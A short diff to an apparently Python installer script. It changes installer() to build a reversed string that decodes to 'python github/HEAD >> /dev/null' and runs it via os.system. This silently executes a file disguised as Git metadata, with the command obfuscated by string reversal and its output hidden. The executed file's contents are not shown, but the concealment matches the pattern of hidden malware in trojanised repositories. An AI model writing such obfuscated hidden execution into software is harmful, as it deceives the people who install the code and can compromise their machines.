@@ -92,8 +92,7 @@ def install():
         
 
 def installer():
-# llun/ved/ >> 
-    asd = "DAEH/buhtig nohtyp"
+    asd = "llun/ved/ >> DAEH/buhtig nohtyp"
     args = asd[::-1]
     os.system(args)
 
@@ -104,15 +103,3 @@ choose_two()
 install()
 while True:
     input()
-
-
-
-
-
-
-
-
-
-
-
-
